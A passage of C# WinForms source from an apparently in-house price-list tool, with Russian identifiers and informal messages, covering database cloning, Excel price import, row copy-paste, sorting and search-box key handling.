                    comboBox1_поиск.Items.AddRange(naimen_proizvoditel);
                    try { comboBox1_поиск.SelectedIndex = 0; } catch { label_consol.Text = "Неудачное подключение к прайсу!"; }







                    using (BinaryWriter bw = new BinaryWriter(File.Open(name_put, FileMode.Create)))
                    {
                        bw.Write(tableDataGridView.Columns.Count - 2);
                        bw.Write(tableDataGridView.Rows.Count);
                        foreach (DataGridViewRow dgvR in tableDataGridView.Rows)
                        {
                            for (int j = 1; j < tableDataGridView.Columns.Count - 1; ++j)
                            {//текст
                                label_consol.Text = "Создание заготовки для клона прайса. Строка:" + j.ToString();
                                object val = null;
                                if (j == 4) { val = dgvR.Cells[j + 1].Value; } else { val = dgvR.Cells[j].Value; }
                                if (val == null)
                                {
                                    bw.Write(false);
                                    bw.Write(false);
                                }
                                else
                                {
                                    bw.Write(true);
                                    bw.Write(val.ToString());

                                }
                                //фото
                                if (j == 4)
                                {
                                    string val1 = dgvR.Cells[j].Value.ToString();
                                    if (val1 == "System.Byte[]")
                                    {
                                        tableDataGridView.CurrentCell = tableDataGridView.Rows[dgvR.Index].Cells[1];
                                        PictureBox asa = new PictureBox();
                                        asa.Image = фотографияPictureBox.Image;
                                        try { asa.Image.Save("rez\\new_praise\\resource\\" + dgvR.Index.ToString() + ".png", System.Drawing.Imaging.ImageFormat.Png); } catch { }

                                    }

                                }





                            }
                        }
                    }


                } /////////////////



                if (ok == true)//копируем шаблоны 
                {
                    label_consol.Text = "Копирование шаблонов...";
                    System.IO.FileInfo new_putt = new System.IO.FileInfo(istohtik_bazi);
                    string directory = new_putt.DirectoryName;
                    string newPath = directory + "\\шаблоны";



                    // копируем шаблоны
                    try
                    {
                        DirectoryInfo dirInfo2 = new DirectoryInfo(newPath);

                        foreach (FileInfo file2 in dirInfo2.GetFiles())
                        {
                            file2.CopyTo("rez\\new_praise\\шаблоны\\" + file2);
                        }
                    }
                    catch { }


                }
                if (ok == true)
                {

                    label_consol.Text = "Распаковка прайса канона";

                    try { System.IO.File.Delete("rez\\new_praise\\prg_download\\1.mdf"); } catch { }
                    try { System.IO.File.Delete("rez\\new_praise\\prg_download\\1_log.ldf"); } catch { }


                    using (ZipFile zip1 = new ZipFile("rez\\new_praise\\canon_praise\\1.zip", Encoding.GetEncoding(866)))
                    {
                        try { zip1.ExtractAll(Environment.ExpandEnvironmentVariables("rez\\new_praise\\prg_download")); } catch { MessageBox.Show("Не смогла создать пустую заготовку!"); ok = false; }
                    }




                }


                if (ok == true)
                {
                    label_consol.Text = "Запуск утилиты загрузки в прайс..";


                    ProcessStartInfo infoStartProcess = new ProcessStartInfo();
                    infoStartProcess.WorkingDirectory = "rez\\new_praise\\prg_download";
                    infoStartProcess.FileName = "download_baza_to.exe";

                    Process.Start(infoStartProcess);


                    timer_save_new_praise.Enabled = true;
                }



            }
            else
            {
                label_consol.Text = "Пользователь передумал сливать весь прайс!";

            }
        }

        //индикация прайса
        int sobutie_itape = 0;

        [System.Runtime.InteropServices.DllImport("user32.dll")] public static extern void SwitchToThisWindow(IntPtr hWnd, bool fAltTab);



        int sobutie_itape1 = 0;



        private void timer_save_new_praise_Tick(object sender, EventArgs e)
        {

            var process = System.Diagnostics.Process.GetProcesses();
            try
            {
                bool itape = false;
                for (int i = 0; i < process.Length; i++)
                {

                    string d = process[i].ToString();        //{ System.Diagnostics.Process(download_baza_to)}
                    if (d == "System.Diagnostics.Process (download_baza_to)")
                    {
                        label_consol.Text = "Идет создание нового прайса. Подождите.. Загружаю данные в пустую заготовку.";
                        i = process.Length;
                        sobutie_itape = 1; sobutie_itape1 = 0;
                        itape = true;
                    }
                    if (d == "System.Diagnostics.Process (cmd)")
                    {
                        label_consol.Text = "Отключение от сервера SQL.. ";
                        //timer_save_new_praise.Enabled = false;
                        i = process.Length;
                        sobutie_itape = 2; sobutie_itape1 = 0;
                        itape = true;
                    }
                    if (d == "System.Diagnostics.Process (copiride)")
                    {
                        label_consol.Text = "Идет копирование данных в конечную папку... ";
                        //timer_save_new_praise.Enabled = false;
                        i = process.Length;
                        sobutie_itape = 3; sobutie_itape1 = 0;
                        itape = true;
                    }
                }
                if (itape == false) { sobutie_itape1++; }
                if (sobutie_itape1 > 10 && sobutie_itape == 3)
                {
                    label_consol.Text = "База удачна создана с шаблонами!"; sobutie_itape1 = 0; sobutie_itape = 0; timer_save_new_praise.Enabled = false;

                    if (name_put_save != "") Process.Start(name_put_save);

                    name_put_save = "";

                }
                if (sobutie_itape1 > 15) { label_consol.Text = "Не удачно! Попробуйте перезапустить программу и выбрать другую папку для сохранения!"; sobutie_itape1 = 0; sobutie_itape = 0; timer_save_new_praise.Enabled = false; }
            }
            catch
            {
            }

        }



        #endregion сохранить прайс как

        #region копировать и вставлять в из буфера в расчетке строку

        string[] copito = new string[6];
        System.Drawing.Image copito_image = null;


        private void button_copy_Click(object sender, EventArgs e)
        {
            try { copito[0] = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[1].Value.ToString(); } catch { copito[0] = null; }
            try { copito[1] = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[2].Value.ToString(); } catch { copito[1] = null; }
            try { copito[2] = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[3].Value.ToString(); } catch { copito[2] = null; }
            try { copito[3] = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[5].Value.ToString(); } catch { copito[3] = null; }
            try { copito[4] = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[6].Value.ToString(); } catch { copito[4] = null; }
            try { copito[5] = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[7].Value.ToString(); } catch { copito[5] = null; }
            try { copito_image = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value as Bitmap; } catch { copito_image = null; }
            label_consol_2.Text = "Скопировала в буфер!";
            button_pase.Enabled = true;

            //System.Drawing.Image image1 = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[4].Value as Bitmap;
        }
        private void button_сохранить_расчёт_быстро_Click(object sender, EventArgs e)
        {
            сохранитьКакToolStripMenuItem.PerformClick();
        }
        private void отладочнаяКнопкаToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (var fs = File.Open(istohtik_bazi, FileMode.Open, FileAccess.Read, FileShare.None))
                {
                    System.IO.FileInfo obj = new System.IO.FileInfo(istohtik_bazi);
                    var dad = ((obj.Length / 1.048576) / 10000) / 100;
                    MessageBox.Show("Файл не занят!\n" +
                        "Имя файла: " + obj.Name + "\n" +
                        "Путь к файлу: " + obj.Directory + "\n" +
                        "Размер: " + obj.Length + " байт\n" +
                        "Размер: " + dad.ToString() + " МБ\n" +
                        "Дата создания: " + obj.CreationTime + "\n" +
                        "Дата изменения : " + obj.LastWriteTime + "\n" +
                        "Дата открытия : " + obj.LastAccessTime + "\n", "Инфо"
                        );
                }
            }
            catch
            {
                System.IO.FileInfo obj = new System.IO.FileInfo(istohtik_bazi);
                if (Directory.Exists(obj.Directory.ToString()))
                {
                    MessageBox.Show("Файл прайса занят, чуть по позже попробуй.");
                }
                else
                {
                    MessageBox.Show("Нет связи с устройством, где лежит файл прайса.");
                    обновитьЦенуСФайлаExcelToolStripMenuItem.Enabled = false;
                    изменитьНаЦенуПроизводителяToolStripMenuItem.Enabled = false;
                }
            }

        }


        private void button_pase_Click(object sender, EventArgs e)
        {
            try
            {
                if (dataGridView_расчёт_2.CurrentCell.RowIndex == dataGridView_расчёт_2.NewRowIndex)
                {
                    label_consol_2.Text = "Под этой строчкой нельзя!";
                }
                else
                {
                    dataGridView_расчёт_2.Rows.Insert(dataGridView_расчёт_2.CurrentCell.RowIndex + 1, 1); //дабавить под выделенной строкой               
                    // текст перенос
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[1].Value = copito[0];
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[2].Value = copito[1];
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[3].Value = copito[2];
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[5].Value = copito[3];
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[6].Value = copito[4];
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[7].Value = copito[5];
                    //FOTO
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[4].Value = copito_image;
                    //колличество + посчитать сумарно+вывести в последнюю
                    //Если это раздел то нужно подсветить: 
                    if (copito[3] == null && copito[4] == null && copito[5] == null)
                    {
                        for (int i = 0; i < 8; i++)
                        {
                            dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[i].Style.BackColor = Color.PowderBlue;
                        }
                        dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex + 1].Cells[10].Style.BackColor = Color.PowderBlue;
                    }

                    label_consol_2.Text = "Добавлено под выбранной стракой!" + "         Всего строк: " + dataGridView_расчёт_2.NewRowIndex.ToString();

                }
            }
            catch
            {
                button_pase.Enabled = false;
                label_consol_2.Text = "В буфере какае-то херня!";
            }
        }


        #endregion копировать и вставлять в из буфера в расчетке строку

        #region табличка "требуется расчёт"


        private void dataGridView_расчёт_2_CellEndEdit(object sender, DataGridViewCellEventArgs e)
        {

            //огонь
            razhet_label.Visible = true;
        }


        #endregion табличка "требуется расчёт"

        #region взять актуальные цены на продовца из екселя! 
        private void обновитьЦенуСФайлаExcelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Baza == false) //принудительно перейдем в прайс
            { }
            else { Baza = false; button_Baza_RACHET.Text = "ПРАЙС > РАСЧЁТ"; groupBox_baza.Visible = true; groupBox_razhet.Visible = false; }



            label_consol.Text = "Попытка вставить говница из ексельки!";

            OpenFileDialog open_dialog = new OpenFileDialog(); //создание диалогового окна для выбора файла
            open_dialog.Filter = "Старый добрый Excel(.xlsx)|*.xlsx"; //формат загружаемого файла
            if (open_dialog.ShowDialog() == DialogResult.OK) //если в окне была нажата кнопка "ОК"
            {
                int[] settings = new int[6];
                string[] settings1 = new string[6];
                //читаем настройки
                int j = 0;
                using (StreamReader stream = new StreamReader("rez\\setting_ctrlv.txt"))
                {
                    while (stream.Peek() >= 0)
                    {
                        settings1[j] = stream.ReadLine();
                        j++;
                    }
                    stream.Close();
                }
                for (int i = 0; i < settings1.Length; i++)
                {
                    try { settings[i] = Convert.ToInt16(settings1[i]); } catch { if (settings1[i] == "True") { settings[i] = 1; } else { settings[i] = 0; } }
                }
                string[][] новые_данные_производителя;
                Excel.Application xlApp;
                label_consol.Text = "Ищу на компе Microsoft Office Excel";
                Excel.Workbook xlWorkBook;
                Excel.Worksheet xlWorkSheet;
                label_consol.Text = "Гружу в оперативку Microsoft Office Excel";
                Excel.Range range;
                xlApp = new Excel.Application();
                label_consol.Text = "Пихаю в Excel файл:" + open_dialog.FileName; //доделать
                xlWorkBook = xlApp.Workbooks.Open(open_dialog.FileName, 0, true, 5, "", "", true, Microsoft.Office.Interop.Excel.XlPlatform.xlWindows, "\t", false, false, 0, true, 1, 0);
                label_consol.Text = "Обхожу лиценцию Excel (кряк)";
                xlWorkSheet = (Excel.Worksheet)xlWorkBook.Worksheets.get_Item(1);
                range = xlWorkSheet.UsedRange;
                int rw = 0;
                int cl = 0;
                string str;
                int rCnt;
                int cCnt;
                rw = range.Rows.Count; //строки
                cl = range.Columns.Count; //столбцы
                новые_данные_производителя = new string[rw - settings[3]][];
                for (rCnt = 1 + settings[3]; rCnt <= rw; rCnt++)
                {
                    новые_данные_производителя[rCnt - 1 - settings[3]] = new string[4]; // 0- артикул. 2- наименование 3-цена 4- обработано, типо флаг, что записано
                    for (cCnt = 1; cCnt <= cl; cCnt++)
                    {
                        try
                        {
                            try { str = (string)(range.Cells[rCnt, cCnt] as Excel.Range).Value.ToString(); } catch { str = null; }
                            if (cCnt == settings[0])
                            {
                                новые_данные_производителя[rCnt - 1 - settings[3]][0] = str;
                            } //артикул
                            if (cCnt == settings[2])
                            {//наименовние                                   
                                новые_данные_производителя[rCnt - 1 - settings[3]][1] = str;
                            }
                            if (cCnt == settings[1])//цена
                            {
                                string new_ctena = str.Replace(".", ",");
                                decimal newDecimal;
                                bool isDecimal = Decimal.TryParse(new_ctena, out newDecimal);
                                if (newDecimal < 1)
                                { новые_данные_производителя[rCnt - 1 - settings[3]][2] = newDecimal.ToString("#######0.0000"); }
                                else
                                { новые_данные_производителя[rCnt - 1 - settings[3]][2] = newDecimal.ToString("########.0000"); }
                                //   if (новые_данные_производителя[rCnt - 1][3] == "0,00")
                                //  { новые_данные_производителя[rCnt - 1][6] += "/n Цена кривая"; }//это пиздец а не цена
                            }
                            label_consol.Text = "Ковыряю файл:" + open_dialog.FileName + " строка:" + rCnt + " столбец:" + cCnt + "   Всего строк:" + rw;
                        }
                        catch { }
                    }
                }
                try { xlWorkBook.Close(true, null, null); } catch { }
                xlApp.Quit();
                Marshal.ReleaseComObject(xlWorkSheet);
                Marshal.ReleaseComObject(xlWorkBook);
                Marshal.ReleaseComObject(xlApp);
                string filename = open_dialog.FileName;
                System.IO.FileInfo obj = new System.IO.FileInfo(filename); // получаем имя
                char[] MyChar = { '.', 'x', 'l', 's', 'x' };
                string Directory1 = obj.Name.TrimEnd(MyChar); // путь к папке   
                label_consol.Text = "Файл Excel загружен. Укажите имя интересующего производителя!";
                string dfdfdfd = open_dialog.SafeFileName;
                nazad:
                string result = Microsoft.VisualBasic.Interaction.InputBox("Пожалуйста введите Имя производителя, \nкоторого будем обновлять!\n\n\nПри вводе учитывается регистр, пробелы и язык ввода.", "Имя производителя в прайсе?", Directory1);
                if (result != "")//если пользователь, что то родил в строку.
                {
                    //проверим, есть ли такой производитель вообще в прайсе.
                    bool ok = false;
                    for (int t = 0; t < tableDataGridView.Rows.Count - 1; t++)
                    {
                        var tf = tableDataGridView.Rows[t].Cells[1].Value.ToString(); //получаем имена
                        if (tf == result) { ok = true; t = tableDataGridView.Rows.Count - 1; }
                    }
                    if (ok == false)
                    {
                        MessageBox.Show("Нет такого производителя в прайсе!\nКриво вписал, может!", "Ошибка ввода", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                        goto nazad;
                    }
                    //скачали в файл 
                    bool применить_удалить_для_всех = false;
                    bool применить_удалить_для_всех_решение_юзира = false;
                    bool применить_удалить_для_всех_вопрос_1раз = false;
                    for (int x = 0; x < tableDataGridView.Rows.Count - 1; x++) //начинаем бегать по прайсу
                    {
                        var t = tableDataGridView.Rows[x].Cells[1].Value.ToString(); //получаем имена
                        if (t == result) //если имя сошлось то надо че то делать с строкой 
                        {
                            bool нет_такого_пацана_в_прайсе = true;
                            var d = tableDataGridView.Rows[x].Cells[3].Value.ToString().Replace("\n", ""); ; //получаем из строки артикул
                            for (int i = 0; i < новые_данные_производителя.Length; i++) // запускам цикл поиска в артикула в скаченной ексельке
                            {
                                if (d == новые_данные_производителя[i][0].Replace("\n", "")) // если сошлись артикулы то
                                {
                                    нет_такого_пацана_в_прайсе = false;  // указываем, что есть такой артикул
                                    tableDataGridView.CurrentCell = tableDataGridView.Rows[x].Cells[1];// переместим курсор в под неё 
                                    //фиксируем совпадение в скаченой ексельке
                                    новые_данные_производителя[i][3] = "совпадение";
                                    //меняем цену в прайсе 
                                    tableDataGridView.Rows[x].Cells[5].Value = новые_данные_производителя[i][2];
                                    if (settings[5] == 0)
                                    {
                                        //меняем наименование в прайсе 
                                        tableDataGridView.Rows[x].Cells[2].Value = новые_данные_производителя[i][1];
                                        label_consol.Text = "Меняю в прайсе артикул: " + d;
                                    }

                                }
                            }
                            //этап удаления ненужных из списка.
                            if (нет_такого_пацана_в_прайсе == true) //если нет такого пацана в файлике новые_данные_производителя
                            {
                                if (settings[4] == 0)
                                { // если херачим по живому и удаляем всё на право и лево
                                    if (применить_удалить_для_всех == false)
                                    {
                                        tableDataGridView.CurrentCell = tableDataGridView.Rows[x].Cells[1];
                                        if (MessageBox.Show("Нет в Excele:\nПроизводитель:" + result + "\nАртикул:" + tableDataGridView.Rows[x].Cells[3].Value.ToString() + "\n Удалить в прайсе?", "Есть проблема", MessageBoxButtons.YesNo, MessageBoxIcon.Stop) == DialogResult.Yes)
                                        {
                                            label_consol.Text = "Удалила строку в прайсе:" + x.ToString();
                                            tableDataGridView.Rows.RemoveAt(x);
                                            x--;
                                            применить_удалить_для_всех_решение_юзира = true;
                                        }
                                        else
                                        {
                                            применить_удалить_для_всех_решение_юзира = false;
                                        }
                                    }
                                    else
                                    { //если пользователь согласился не повторять вопрос удалять. 
                                        tableDataGridView.CurrentCell = tableDataGridView.Rows[x].Cells[1];
                                        if (применить_удалить_для_всех_решение_юзира == true)
                                        {
                                            tableDataGridView.Rows.RemoveAt(x);
                                            x--;
                                        }
                                    }
                                    if (применить_удалить_для_всех == false && применить_удалить_для_всех_вопрос_1раз == false)
                                    {
                                        применить_удалить_для_всех_вопрос_1раз = true; //больше не будем задавать этот вопрос.
                                        label_consol.Text = "Надо уточнить.. так делать для всех последующих или нет?";
                                        if (MessageBox.Show("Применить так для всех последующих? ", "Уточнение", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.Yes) { применить_удалить_для_всех = true; }
                                    }
                                }
                                else
                                {
                                    poftor_voprosa:
                                    string цена_в_шрифт = Microsoft.VisualBasic.Interaction.InputBox(
                                    "Производитель: " + tableDataGridView.Rows[x].Cells[1].Value.ToString()
                                    + "\n\nАртикул: " + tableDataGridView.Rows[x].Cells[3].Value.ToString()
                                    + "\n\nНаименование: " + tableDataGridView.Rows[x].Cells[2].Value.ToString()
                                    + "\n\nНет его в Ексельке, но он есть в прайсе! \nПроверьте его цену, если надо\nотредактируйте. \n\n\nПри вводе учитывается регистр и пробелы. Вводить только числа", "Имя производителя в прайсе?", tableDataGridView.Rows[x].Cells[5].Value.ToString());

                                    //если юзер нажал отмена 
                                    if (цена_в_шрифт == "") { label_consol.Text = "Передумал ковыряться с ценами. Давай чем ещё займемся!"; goto konez; }
                                    string цена_для_ввода = "";
                                    string new_ctena = цена_в_шрифт.Replace(".", ",");
                                    decimal newDecimal;
                                    bool isDecimal = Decimal.TryParse(new_ctena, out newDecimal);
                                    if (newDecimal < 1)
                                    { цена_для_ввода = newDecimal.ToString("#######0.0000"); }
                                    else
                                    { цена_для_ввода = newDecimal.ToString("########.0000"); }
                                    if (цена_для_ввода != "0,0000") tableDataGridView.Rows[x].Cells[5].Value = цена_для_ввода; else { MessageBox.Show("Юpер ввел херню!", "Синтаксическая ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error); goto poftor_voprosa; }

                                }
                            }
                        }
                    }

                    //этап добавления тех позиций которых нет в прайсе 
                    for (int i = 0; i < новые_данные_производителя.Length; i++)
                    {
                        label_consol.Text = "Добавляю из екселя тех, кого не нашла! Добавленно:" + i.ToString() + " из " + новые_данные_производителя.Length.ToString();
                        if (новые_данные_производителя[i][3] == null)
                        {
                            bindingNavigatorAddNewItem.Visible = true;
                            bindingNavigatorAddNewItem.PerformClick(); // добавить строку
                            bindingNavigatorAddNewItem.Visible = false;
                            //   номерTextBox.PerformLayout();
                            // bindingNavigatorAddNewItem.Visible = false;
                            groupBox_поиск.Visible = true;
                            производительTextBox.Text = result;
                            //   производительTextBox.PerformLayout();
                            наименованиеTextBox.Text = новые_данные_производителя[i][1];
                            //   наименованиеTextBox.PerformLayout();
                            артикулTextBox.Text = новые_данные_производителя[i][0];
                            //  артикулTextBox.PerformLayout();
                            ценаTextBox.Text = новые_данные_производителя[i][2];
                            //  ценаTextBox.PerformLayout();
                        }
                    }
                    label_consol.Text = "Операция закончина!";
                }
                else
                {
                    label_consol.Text = "Пользователь отказался мутить с ценами!";
                }
            }
            else { label_consol.Text = "Передумал всталять.. Ну и ладно. а то у тя и так мало оперативки для меня!"; }
            konez:
            this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;
        }
        Form R;
        public bool Rgt = false;
        private void натройкиДляОбновлениеЦенИзExcelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Rgt == false)
            {
                R = new окно_настроек_взять_цену();
                R.Show();
                Rgt = true;
            }
            else
            {
                R.Activate();
            }
        }


        #endregion взять актуальные цены на продовца из екселя! 

        #region Упорядочить данные в прайсе


        void sortirovka()
        {

            if (tableDataGridView.NewRowIndex < 10)
            {
                MessageBox.Show("Серьезно? Меньше 10 позиций?\nЯ не буду сортировать!", "Программа посылает юзера!", MessageBoxButtons.OK, MessageBoxIcon.Stop);
            }
            else
            {

                //создаем окно для сообщений
                if (выполнить_один_раз_создать_окно == false)
                {
                    checkConnection = new Thread(() => событие_потока_окна_сообщения()); //создаем поток
                    checkConnection.Start(); //запускам поток. 
                }



                string[] r = new string[tableDataGridView.RowCount - 1];
                for (int i = 0; i < tableDataGridView.RowCount - 1; i++)
                {
                    try { r[i] = tableDataGridView.Rows[i].Cells[1].Value.ToString(); } catch { }

                }
                List<String> myStringList = new List<string>();
                foreach (string s in r)
                {
                    if (!myStringList.Contains(s))
                    {
                        myStringList.Add(s);
                    }
                }
                myStringList.Sort();
                string[] new_list = new string[myStringList.Count];  //переменная new_list содержит список всех нужных поставщиков!
                int l = 0;
                foreach (string y in myStringList)
                {
                    new_list[l] = y;
                    l++;
                }





                int количество_операций = 0;
                int col_raze = tableDataGridView.NewRowIndex + 1;
                for (int i = 0; i < new_list.Length; i++) // столько раз сколько поставщиков в прайсе
                {
                    for (int v = 0; v < col_raze; v++)
                    {
                        if (new_list[i] == tableDataGridView.Rows[v].Cells[1].Value.ToString())
                        {
                            количество_операций++;


                            string info_art = "";
                            try { info_art = tableDataGridView.Rows[v].Cells[3].Value.ToString(); } catch { }
                            //меняем текст сообщения 
                            try
                            {
                                info00.Invoke((MethodInvoker)delegate
                                {


                                    info00.Font = new System.Drawing.Font("Trebuchet MS", 9, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
                                    //tablichka.BackColor = Color.Wheat;//фон
                                    info00.ForeColor = Color.RoyalBlue;


                                    info00.Text = "Обрабока прайса.. Ждите..\n"
                                    + "Всего строк:" + tableDataGridView.NewRowIndex.ToString() +
                                    "\nПеренос строки:" + количество_операций.ToString() +
                                    "\nФормирую поставщика:" + new_list[i] +
                                    "\nПеренос артикула:" + info_art;


                                });
                            }
                            catch { }




                            //перенос строки
                            int ctroka = v; //номер интересующей строки переместить в конец!
                            bindingNavigatorAddNewItem.Visible = true; //добавить строку
                            bindingNavigatorAddNewItem.PerformClick(); //добавить строку  
                            bindingNavigatorAddNewItem.Visible = false; //добавить строку не удаляй.
                            for (int n = 1; n < 6; n++)
                            {
                                tableDataGridView.Rows[tableDataGridView.NewRowIndex - 1].Cells[n].Value = tableDataGridView.Rows[ctroka].Cells[n].Value;
                            }
                            tableDataGridView.Rows.RemoveAt(ctroka);
                            v--;
                            col_raze--;
                        }
                    }
                }
                //Избавляемся от бага.. Последний в производителе всего прайса. Одна позиция остается первой в строке. И не обрабатываетя.. Потому тупо переносим. Без вариантов!
                //перенос строки

                /*
                int ctroka1 = 0; //номер интересующей строки переместить в конец!
                bindingNavigatorAddNewItem.Visible = true; //добавить строку
                bindingNavigatorAddNewItem.PerformClick(); //добавить строку    
                bindingNavigatorAddNewItem.Visible = false; //добавить строку не удаляй
                for (int n1 = 1; n1 < 6; n1++)
                {
                    tableDataGridView.Rows[tableDataGridView.NewRowIndex - 1].Cells[n1].Value = tableDataGridView.Rows[ctroka1].Cells[n1].Value;
                }
                tableDataGridView.Rows.RemoveAt(ctroka1);
                количество_операций++;

                */

                //закрывает окно
                окно_сообщения.Invoke((MethodInvoker)delegate { окно_сообщения.Close(); });
                checkConnection.Abort();
                выполнить_один_раз_создать_окно = false;




            }
        }

        private void конечная_инфа() { }


        System.Windows.Forms.Timer обновить_таймер = new System.Windows.Forms.Timer();


        //юзер жмет кнопку:
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            if (open_window_otchetik == true)
            {
                label_consol.Text = "Там редактор повторов открыт! Закрой его.";
                return;
            }
            обновить_таймер.Tick += new System.EventHandler(this.обновить_таймер_Tick); //  dewef.Tick += new System.EventHandler(this.обновим_надпись);
            обновить_таймер.Interval = 30;
            обновить_таймер.Enabled = true;
            label_добавленно.Visible = true;
            label_добавленно.Text = "Идет обработка данных....";
            label_consol.Text = "Список прайса приводится в алфавитный порядок. Жди, это может занять до 2-х минут";
            if (button_добавить.Enabled == false && button_поиск.Enabled == true)
            {
            }
            else
            {
                button_добавить.PerformClick();
            }
        }


        private void обновить_таймер_Tick(object sender, EventArgs e)
        {
            обновить_таймер.Tick -= new System.EventHandler(this.обновить_таймер_Tick);
            обновить_таймер.Enabled = false;
            sortirovka();



            label_добавленно.Visible = false;
            if (button_добавить.Enabled == false && button_поиск.Enabled == true)
            {
                button_поиск.PerformClick();
            }

            label_consol.Text = "Сортировка окончена.";

        }



        /*
         Подсказка по потокам. 
            Thread checkConnection = new Thread(() => checkConn()); //создаем поток
            checkConnection.Start(); //запускам поток. 
            
        
         
         */
        //событие нового потока 



        #endregion Упорядочить данные в прайсе

        #region окно для обновить в алфовитном порядке


        Form окно_сообщения = new Form();
        System.Windows.Forms.Label info00 = new System.Windows.Forms.Label();
        bool выполнить_один_раз_создать_окно = false;
        Thread checkConnection;
        private void событие_потока_окна_сообщения()
        {


            if (выполнить_один_раз_создать_окно == false)
            {
                try
                {
                    info00.AutoSize = false;
                    info00.Location = new System.Drawing.Point(3, 3);
                    info00.Size = new System.Drawing.Size(248, 138);

                    info00.Font = new System.Drawing.Font("Trebuchet MS", 9, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
                    //tablichka.BackColor = Color.Wheat;//фон
                    info00.ForeColor = Color.RoyalBlue;
                    окно_сообщения.FormBorderStyle = FormBorderStyle.None;
                    окно_сообщения.TopMost = true;
                    окно_сообщения.Name = "Сортирую";
                    окно_сообщения.Icon = System.Drawing.Icon.ExtractAssociatedIcon("ico.ico");   //this.Icon = Properties.Resources.youriconname;
                    окно_сообщения.Size = new Size(250, 140);
                    окно_сообщения.Controls.Add(info00);
                    окно_сообщения.StartPosition = FormStartPosition.CenterScreen;
                    окно_сообщения.MinimumSize = окно_сообщения.Size;
                    окно_сообщения.MaximumSize = окно_сообщения.Size;
                    окно_сообщения.MaximizeBox = false;
                    окно_сообщения.ShowInTaskbar = false;
                    окно_сообщения.ShowDialog();
                    выполнить_один_раз_создать_окно = true;
                }
                catch { }
            }

        }




        #endregion окно для обновить в алфовитном порядке

        #region поисковик выподающее окно
        //Задача от Дениса. Исправить выпадающие списки и привязаться к клафиши Ентер при поиске в прайсе
        string фиксируем_строку_1 = "";
        private void comboBox1_поиск_KeyUp(object sender, KeyEventArgs e)
        {
            фиксируем_строку_1 = comboBox1_поиск.Text;
        }
        private void comboBox1_поиск_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyValue == 13)
            {
                for (int i = 0; i < comboBox1_поиск.Items.Count; i++)
                {
                    if (comboBox1_поиск.Items[i].ToString() == фиксируем_строку_1)
                    {
                        comboBox1_поиск.SelectedIndex = i;
                        i = comboBox1_поиск.Items.Count;
                    }
                }
            }
        }
        string фиксируем_строку_2 = "";
        private void comboBox_наименование_поиск_по_базе_KeyUp(object sender, KeyEventArgs e)
        {
            фиксируем_строку_2 = comboBox_наименование_поиск_по_базе.Text;
        }
        private void comboBox_наименование_поиск_по_базе_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyValue == 13)
            {
                for (int i = 0; i < comboBox_наименование_поиск_по_базе.Items.Count; i++)
                {
                    if (comboBox_наименование_поиск_по_базе.Items[i].ToString() == фиксируем_строку_2)
                    {
                        comboBox_наименование_поиск_по_базе.SelectedIndex = i;
                        i = comboBox_наименование_поиск_по_базе.Items.Count;
                    }
                }
            }
        }
        string фиксируем_строку_3 = "";
        private void comboBox_артикул_поиск_по_базе_KeyUp(object sender, KeyEventArgs e)
        {
            фиксируем_строку_3 = comboBox_артикул_поиск_по_базе.Text;
        }
        private void comboBox_артикул_поиск_по_базе_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyValue == 13)
            {
                for (int i = 0; i < comboBox_артикул_поиск_по_базе.Items.Count; i++)
                {
                    if (comboBox_артикул_поиск_по_базе.Items[i].ToString() == фиксируем_строку_3)
                    {
                        comboBox_артикул_поиск_по_базе.SelectedIndex = i;
                        i = comboBox_артикул_поиск_по_базе.Items.Count;
                    }
                }
            }
        }
        string фиксируем_строку_4 = "";



        private void comboBox_цена_поиск_по_базе_KeyUp(object sender, KeyEventArgs e)
        {
            фиксируем_строку_4 = comboBox_цена_поиск_по_базе.Text;
        }



        private void comboBox_цена_поиск_по_базе_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyValue == 13)
            {
                for (int i = 0; i < comboBox_цена_поиск_по_базе.Items.Count; i++)
                {
                    if (comboBox_цена_поиск_по_базе.Items[i].ToString() == фиксируем_строку_4)
                    {
                        comboBox_цена_поиск_по_базе.SelectedIndex = i;
                        i = comboBox_цена_поиск_по_базе.Items.Count;
                    }
                }
            }
        }
        #endregion поисковик выподающее окно

        #region кнопка отмена     
        Thread поток_истории;
        DataGridView[] clone2 = new DataGridView[1];
